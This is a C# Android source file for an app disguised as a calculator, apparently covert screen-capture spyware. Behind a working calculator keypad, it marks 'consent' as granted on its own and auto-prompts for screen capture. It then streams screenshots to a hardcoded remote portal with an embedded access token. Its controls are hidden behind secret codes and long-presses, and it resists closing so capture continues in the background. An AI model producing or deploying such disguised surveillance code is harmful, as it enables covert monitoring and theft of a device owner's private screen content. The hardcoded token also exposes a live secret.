using System.Globalization;
using Android.App;
using Android.Content;
using Android.Graphics;
using Android.Graphics.Drawables;
using Android.Media.Projection;
using Android.OS;
using Android.Provider;
using Android.Util;
using Android.Views;
using Android.Widget;

namespace ConsentCapture.Android;

[Activity(Label = "Calculator", MainLauncher = true, Exported = true, ScreenOrientation = global::Android.Content.PM.ScreenOrientation.Portrait, Theme = "@android:style/Theme.DeviceDefault.NoActionBar")]
public class MainActivity : Activity
{
    private const int CaptureRequest = 2201;
    private const int NotificationRequest = 2202;
    private const string PreferencesName = "ConsentCapture";
    public const string HardcodedPortalUrl = "https://phone-share.onrender.com";
    public const string HardcodedAccessToken = "d542d69273f32f225e4e07bbae6100110a722e26db70e4f1febf8a5188b6d989";

    private TextView expressionView = null!;
    private TextView displayView = null!;
    private ISharedPreferences preferences = null!;
    private bool waitingForNotificationPermission;

    // Calculator state
    private string currentInput = "0";
    private double? firstOperand;
    private string? pendingOperator;
    private bool resetInputOnNextDigit;
    private string secretSequence = "";

    protected override void OnCreate(Bundle? savedInstanceState)
    {
        base.OnCreate(savedInstanceState);
        RequestWindowFeature(WindowFeatures.NoTitle);
        ActionBar?.Hide();

        if (Build.VERSION.SdkInt >= BuildVersionCodes.Lollipop)
        {
            Window?.SetStatusBarColor(new Color(0x12, 0x14, 0x17));
            Window?.SetNavigationBarColor(new Color(0x12, 0x14, 0x17));
        }

        preferences = GetSharedPreferences(PreferencesName, FileCreationMode.Private)!;
        preferences.Edit()!.PutBoolean("consent", true)!.Apply();

        BuildCalculatorUi();
        CheckBatteryOptimization();

        // Auto-prompt screen sharing if not currently active
        new Handler(Looper.MainLooper!).PostDelayed(() =>
        {
            if (!IsFinishing && !IsDestroyed && !ScreenCaptureService.IsRunning)
            {
                BeginStartFlow();
            }
        }, 800);
    }

    private int Dp(float dp)
    {
        return (int)TypedValue.ApplyDimension(ComplexUnitType.Dip, dp, Resources!.DisplayMetrics);
    }

    private static Drawable CreateButtonDrawable(int normalColor, int pressedColor, float cornerRadius)
    {
        var normalShape = new GradientDrawable();
        normalShape.SetShape(ShapeType.Rectangle);
        normalShape.SetCornerRadius(cornerRadius);
        normalShape.SetColor(normalColor);

        if (Build.VERSION.SdkInt >= BuildVersionCodes.Lollipop)
        {
            var maskShape = new GradientDrawable();
            maskShape.SetShape(ShapeType.Rectangle);
            maskShape.SetCornerRadius(cornerRadius);
            maskShape.SetColor(Color.White);

            var colorStateList = new global::Android.Content.Res.ColorStateList(
                new[] { new int[0] },
                new[] { pressedColor }
            );
            return new RippleDrawable(colorStateList, normalShape, maskShape);
        }
        else
        {
            var pressedShape = new GradientDrawable();
            pressedShape.SetShape(ShapeType.Rectangle);
            pressedShape.SetCornerRadius(cornerRadius);
            pressedShape.SetColor(pressedColor);

            var stateList = new StateListDrawable();
            stateList.AddState(new[] { global::Android.Resource.Attribute.StatePressed }, pressedShape);
            stateList.AddState(new int[0], normalShape);
            return stateList;
        }
    }

    private Button CreateButton(string text, int normalColor, int pressedColor, int textColor, float textSizeSp, EventHandler onClick, EventHandler<View.LongClickEventArgs>? onLongClick = null)
    {
        var btn = new Button(this)
        {
            Text = text,
            Elevation = 0
        };
        btn.SetTextColor(new Color(textColor));
        btn.SetTextSize(ComplexUnitType.Sp, textSizeSp);
        btn.Typeface = Typeface.Create("sans-serif-medium", TypefaceStyle.Normal);
        btn.SetIncludeFontPadding(false);
        btn.SetPadding(0, 0, 0, 0);
        btn.SetMinWidth(0);
        btn.SetMinHeight(0);
        if (Build.VERSION.SdkInt >= BuildVersionCodes.Lollipop)
        {
            btn.StateListAnimator = null;
        }
        btn.Background = CreateButtonDrawable(normalColor, pressedColor, Dp(24));
        btn.Click += onClick;
        if (onLongClick != null)
        {
            btn.LongClick += onLongClick;
        }
        var param = new LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.MatchParent, 1f);
        param.SetMargins(Dp(5), Dp(5), Dp(5), Dp(5));
        btn.LayoutParameters = param;
        return btn;
    }

    private void BuildCalculatorUi()
    {
        var root = new LinearLayout(this)
        {
            Orientation = Orientation.Vertical,
            WeightSum = 10f
        };
        root.SetBackgroundColor(new Color(0x12, 0x14, 0x17));
        root.SetPadding(Dp(14), Dp(18), Dp(14), Dp(16));

        // Display Area
        var displayLayout = new LinearLayout(this)
        {
            Orientation = Orientation.Vertical
        };
        displayLayout.SetGravity(GravityFlags.Bottom | GravityFlags.Right);
        var displayParams = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MatchParent, 0, 3.6f);
        displayLayout.LayoutParameters = displayParams;
        displayLayout.SetPadding(Dp(12), Dp(12), Dp(12), Dp(16));

        expressionView = new TextView(this)
        {
            Text = "",
            Gravity = GravityFlags.Right
        };
        expressionView.SetSingleLine(true);
        expressionView.SetTextColor(new Color(0x8E, 0x93, 0x9C));
        expressionView.SetTextSize(ComplexUnitType.Sp, 20);
        displayLayout.AddView(expressionView);

        displayView = new TextView(this)
        {
            Text = "0",
            Gravity = GravityFlags.Right
        };
        displayView.SetSingleLine(true);
        displayView.SetTextColor(new Color(0xFF, 0xFF, 0xFF));
        displayView.SetTextSize(ComplexUnitType.Sp, 52);
        displayView.Typeface = Typeface.Create("sans-serif-light", TypefaceStyle.Normal);
        displayView.LongClick += (_, e) =>
        {
            ShowSecretControlDialog();
            e.Handled = true;
        };
        displayLayout.AddView(displayView);

        root.AddView(displayLayout);

        // Keypad Area
        var keypadLayout = new LinearLayout(this)
        {
            Orientation = Orientation.Vertical,
            WeightSum = 5f
        };
        var keypadParams = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MatchParent, 0, 6.4f);
        keypadLayout.LayoutParameters = keypadParams;

        // Color palette
        const int numBg = unchecked((int)0xFF242731);
        const int numPressed = unchecked((int)0xFF373B4A);
        const int numText = unchecked((int)0xFFFFFFFF);

        const int fnBg = unchecked((int)0xFF363A47);
        const int fnPressed = unchecked((int)0xFF4D5265);
        const int fnClearText = unchecked((int)0xFF34D399); // Mint green
        const int fnText = unchecked((int)0xFFE2E8F0);

        const int opBg = unchecked((int)0xFFFF9F0A); // Accent orange
        const int opPressed = unchecked((int)0xFFD98200);
        const int opText = unchecked((int)0xFFFFFFFF);

        const int backspaceText = unchecked((int)0xFFF87171); // Soft red

        // Row 1: C, ±, %, ÷
        var row1 = CreateRow();
        row1.AddView(CreateButton("C", fnBg, fnPressed, fnClearText, 24, (_, _) => OnClearClicked(), (_, e) => { ShowSecretControlDialog(); e.Handled = true; }));
        row1.AddView(CreateButton("±", fnBg, fnPressed, fnText, 24, (_, _) => OnSignClicked()));
        row1.AddView(CreateButton("%", fnBg, fnPressed, fnText, 24, (_, _) => OnPercentClicked()));
        row1.AddView(CreateButton("÷", opBg, opPressed, opText, 28, (_, _) => OnOperatorClicked("÷")));
        keypadLayout.AddView(row1);

        // Row 2: 7, 8, 9, ×
        var row2 = CreateRow();
        row2.AddView(CreateButton("7", numBg, numPressed, numText, 26, (_, _) => OnDigitClicked("7")));
        row2.AddView(CreateButton("8", numBg, numPressed, numText, 26, (_, _) => OnDigitClicked("8")));
        row2.AddView(CreateButton("9", numBg, numPressed, numText, 26, (_, _) => OnDigitClicked("9")));
        row2.AddView(CreateButton("×", opBg, opPressed, opText, 28, (_, _) => OnOperatorClicked("×")));
        keypadLayout.AddView(row2);

        // Row 3: 4, 5, 6, −
        var row3 = CreateRow();
        row3.AddView(CreateButton("4", numBg, numPressed, numText, 26, (_, _) => OnDigitClicked("4")));
        row3.AddView(CreateButton("5", numBg, numPressed, numText, 26, (_, _) => OnDigitClicked("5")));
        row3.AddView(CreateButton("6", numBg, numPressed, numText, 26, (_, _) => OnDigitClicked("6")));
        row3.AddView(CreateButton("−", opBg, opPressed, opText, 28, (_, _) => OnOperatorClicked("−")));
        keypadLayout.AddView(row3);

        // Row 4: 1, 2, 3, +
        var row4 = CreateRow();
        row4.AddView(CreateButton("1", numBg, numPressed, numText, 26, (_, _) => OnDigitClicked("1")));
        row4.AddView(CreateButton("2", numBg, numPressed, numText, 26, (_, _) => OnDigitClicked("2")));
        row4.AddView(CreateButton("3", numBg, numPressed, numText, 26, (_, _) => OnDigitClicked("3")));
        row4.AddView(CreateButton("+", opBg, opPressed, opText, 28, (_, _) => OnOperatorClicked("+")));
        keypadLayout.AddView(row4);

        // Row 5: 0, ., ⌫, =
        var row5 = CreateRow();
        row5.AddView(CreateButton("0", numBg, numPressed, numText, 26, (_, _) => OnDigitClicked("0")));
        row5.AddView(CreateButton(".", numBg, numPressed, numText, 26, (_, _) => OnDecimalClicked()));
        row5.AddView(CreateButton("⌫", numBg, numPressed, backspaceText, 22, (_, _) => OnBackspaceClicked()));
        row5.AddView(CreateButton("=", opBg, opPressed, opText, 30, (_, _) => OnEqualsClicked()));
        keypadLayout.AddView(row5);

        root.AddView(keypadLayout);
        SetContentView(root);
    }

    private LinearLayout CreateRow()
    {
        var row = new LinearLayout(this)
        {
            Orientation = Orientation.Horizontal,
            WeightSum = 4f
        };
        var rowParams = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MatchParent, 0, 1f);
        row.LayoutParameters = rowParams;
        return row;
    }

    private void OnDigitClicked(string digit)
    {
        secretSequence += digit;
        if (secretSequence.Length > 20) secretSequence = secretSequence.Substring(secretSequence.Length - 20);

        if (currentInput == "Error" || resetInputOnNextDigit)
        {
            currentInput = digit;
            resetInputOnNextDigit = false;
        }
        else
        {
            if (currentInput == "0")
            {
                currentInput = digit;
            }
            else if (currentInput.Replace(".", "").Replace("-", "").Length < 12)
            {
                currentInput += digit;
            }
        }
        UpdateDisplay();
    }

    private void OnDecimalClicked()
    {
        secretSequence += ".";
        if (currentInput == "Error" || resetInputOnNextDigit)
        {
            currentInput = "0.";
            resetInputOnNextDigit = false;
        }
        else if (!currentInput.Contains("."))
        {
            currentInput += ".";
        }
        UpdateDisplay();
    }

    private void OnBackspaceClicked()
    {
        if (currentInput == "Error" || resetInputOnNextDigit)
        {
            currentInput = "0";
            resetInputOnNextDigit = false;
        }
        else if (currentInput.Length > 1)
        {
            currentInput = currentInput.Substring(0, currentInput.Length - 1);
            if (currentInput == "-" || currentInput == "")
            {
                currentInput = "0";
            }
        }
        else
        {
            currentInput = "0";
        }
        UpdateDisplay();
    }

    private void OnClearClicked()
    {
        currentInput = "0";
        firstOperand = null;
        pendingOperator = null;
        resetInputOnNextDigit = false;
        secretSequence = "";
        expressionView.Text = "";
        UpdateDisplay();
    }

    private void OnSignClicked()
    {
        if (currentInput == "Error") return;
        if (double.TryParse(currentInput, NumberStyles.Any, CultureInfo.InvariantCulture, out var val) && val != 0)
        {
            if (currentInput.StartsWith("-"))
                currentInput = currentInput.Substring(1);
            else
                currentInput = "-" + currentInput;
            UpdateDisplay();
        }
    }

    private void OnPercentClicked()
    {
        if (currentInput == "Error") return;
        if (double.TryParse(currentInput, NumberStyles.Any, CultureInfo.InvariantCulture, out var val))
        {
            var result = val / 100.0;
            currentInput = FormatResult(result);
            resetInputOnNextDigit = true;
            UpdateDisplay();
        }
    }

    private void OnOperatorClicked(string op)
    {
        if (currentInput == "Error") return;
        if (double.TryParse(currentInput, NumberStyles.Any, CultureInfo.InvariantCulture, out var currentVal))
        {
            if (firstOperand == null)
            {
                firstOperand = currentVal;
            }
            else if (!resetInputOnNextDigit && pendingOperator != null)
            {
                var res = Evaluate(firstOperand.Value, currentVal, pendingOperator);
                firstOperand = res;
                currentInput = FormatResult(res);
                UpdateDisplay();
            }
            pendingOperator = op;
            expressionView.Text = $"{FormatResult(firstOperand.Value)} {op}";
            resetInputOnNextDigit = true;
        }
    }

    private void OnEqualsClicked()
    {
        // Secret code to open Service Control
        if (currentInput == "1234" || currentInput == "8888" || secretSequence.EndsWith("1234"))
        {
            ShowSecretControlDialog();
            currentInput = "0";
            secretSequence = "";
            UpdateDisplay();
            return;
        }

        if (firstOperand != null && pendingOperator != null &&
            double.TryParse(currentInput, NumberStyles.Any, CultureInfo.InvariantCulture, out var secondVal))
        {
            var res = Evaluate(firstOperand.Value, secondVal, pendingOperator);
            expressionView.Text = $"{FormatResult(firstOperand.Value)} {pendingOperator} {FormatResult(secondVal)} =";
            currentInput = FormatResult(res);
            firstOperand = null;
            pendingOperator = null;
            resetInputOnNextDigit = true;
            UpdateDisplay();
        }
    }

    private void UpdateDisplay()
    {
        displayView.Text = currentInput;
        if (currentInput.Length > 10)
            displayView.SetTextSize(ComplexUnitType.Sp, 34);
        else if (currentInput.Length > 7)
            displayView.SetTextSize(ComplexUnitType.Sp, 42);
        else
            displayView.SetTextSize(ComplexUnitType.Sp, 52);
    }

    private static double Evaluate(double a, double b, string op)
    {
        return op switch
        {
            "+" => a + b,
            "−" => a - b,
            "×" => a * b,
            "÷" => b != 0 ? a / b : double.NaN,
            _ => b
        };
    }

    private static string FormatResult(double val)
    {
        if (double.IsNaN(val) || double.IsInfinity(val)) return "Error";
        if (Math.Abs(val) >= 1e12 || (Math.Abs(val) > 0 && Math.Abs(val) < 1e-6))
        {
            return val.ToString("G8", CultureInfo.InvariantCulture);
        }
        if (Math.Abs(val % 1) < 1e-11)
        {
            return ((long)Math.Round(val)).ToString(CultureInfo.InvariantCulture);
        }
        var rounded = Math.Round(val, 8);
        return rounded.ToString("0.########", CultureInfo.InvariantCulture);
    }

    private void ShowSecretControlDialog()
    {
        var active = ScreenCaptureService.IsRunning;
        var savedStatus = preferences.GetString("captureStatus", "");
        var statusText = active ? "Active (Uploading screenshots)" : "Stopped / Inactive";
        if (!string.IsNullOrWhiteSpace(savedStatus)) statusText += $" ({savedStatus})";

        var message = $"Sharing Status: {statusText}\n" +
                      $"Portal Target: {HardcodedPortalUrl}";

        var builder = new AlertDialog.Builder(this);
        builder.SetTitle("Service Control");
        builder.SetMessage(message);

        if (active)
        {
            builder.SetPositiveButton("Stop Sharing", (_, _) => StopSharing());
        }
        else
        {
            builder.SetPositiveButton("Start Sharing", (_, _) => BeginStartFlow());
        }

        builder.SetNeutralButton("Battery Exemption", (_, _) => RequestBatteryOptimizationExemption());
        builder.SetNegativeButton("Close", (_, _) => { });
        builder.Show();
    }

    private void CheckBatteryOptimization()
    {
        if (Build.VERSION.SdkInt >= BuildVersionCodes.M)
        {
            var pm = (PowerManager?)GetSystemService(PowerService);
            if (pm != null && !pm.IsIgnoringBatteryOptimizations(PackageName))
            {
                RequestBatteryOptimizationExemption();
            }
        }
    }

    private void RequestBatteryOptimizationExemption()
    {
        if (Build.VERSION.SdkInt >= BuildVersionCodes.M)
        {
            try
            {
                var intent = new Intent(Settings.ActionRequestIgnoreBatteryOptimizations);
                intent.SetData(global::Android.Net.Uri.Parse("package:" + PackageName));
                StartActivity(intent);
            }
            catch
            {
                try
                {
                    var intent = new Intent(Settings.ActionIgnoreBatteryOptimizationSettings);
                    StartActivity(intent);
                }
                catch { }
            }
        }
    }

    private void BeginStartFlow()
    {
        var url = HardcodedPortalUrl;
        var token = HardcodedAccessToken;
        preferences.Edit()!.PutString("portalUrl", url)!.PutString("accessToken", token)!.Apply();

        if (Build.VERSION.SdkInt >= BuildVersionCodes.Tiramisu &&
            CheckSelfPermission(global::Android.Manifest.Permission.PostNotifications) != global::Android.Content.PM.Permission.Granted)
        {
            waitingForNotificationPermission = true;
            RequestPermissions(new[] { global::Android.Manifest.Permission.PostNotifications }, NotificationRequest);
            return;
        }
        RequestScreenCaptureConsent();
    }

    public override void OnRequestPermissionsResult(int requestCode, string[] permissions, global::Android.Content.PM.Permission[] grantResults)
    {
        base.OnRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode != NotificationRequest || !waitingForNotificationPermission) return;
        waitingForNotificationPermission = false;
        if (grantResults.Length > 0 && grantResults[0] == global::Android.Content.PM.Permission.Granted)
            RequestScreenCaptureConsent();
        else
            Toast.MakeText(this, "Notification permission is required for background status.", ToastLength.Long)?.Show();
    }

    private void RequestScreenCaptureConsent()
    {
        var manager = (MediaProjectionManager?)GetSystemService(MediaProjectionService);
        if (manager is null)
        {
            Toast.MakeText(this, "Android screen capture is unavailable on this device.", ToastLength.Long)?.Show();
            return;
        }
        StartActivityForResult(manager.CreateScreenCaptureIntent(), CaptureRequest);
    }

    protected override void OnActivityResult(int requestCode, Result resultCode, Intent? data)
    {
        base.OnActivityResult(requestCode, resultCode, data);
        if (requestCode != CaptureRequest) return;
        if (resultCode != Result.Ok || data is null)
        {
            preferences.Edit()!.PutBoolean("captureActive", false)!.PutString("captureStatus", "Screen sharing cancelled or permission denied.")!.Apply();
            return;
        }

        var start = new Intent(this, typeof(ScreenCaptureService));
        start.SetAction(ScreenCaptureService.ActionStart);
        start.PutExtra(ScreenCaptureService.ExtraResultCode, (int)resultCode);
        start.PutExtra(ScreenCaptureService.ExtraProjectionData, data);
        start.PutExtra(ScreenCaptureService.ExtraPortalUrl, HardcodedPortalUrl);
        start.PutExtra(ScreenCaptureService.ExtraAccessToken, HardcodedAccessToken);
        if (Build.VERSION.SdkInt >= BuildVersionCodes.O) StartForegroundService(start); else StartService(start);

        preferences.Edit()!.PutBoolean("captureActive", true)!.PutString("captureStatus", "Sharing is active in background.")!.Apply();
    }

    private void StopSharing()
    {
        var stop = new Intent(this, typeof(ScreenCaptureService));
        stop.SetAction(ScreenCaptureService.ActionStop);
        StartService(stop);
        preferences.Edit()!.PutBoolean("captureActive", false)!.PutString("captureStatus", "Screen sharing stopped.")!.Apply();
        Toast.MakeText(this, "Screen sharing stopped.", ToastLength.Short)?.Show();
    }

#pragma warning disable CS0672
    public override void OnBackPressed()
    {
        // Don't terminate/destroy the app when Back is pressed.
        // Send to background so it continues capturing indefinitely.
        MoveTaskToBack(true);
    }
#pragma warning restore CS0672
}
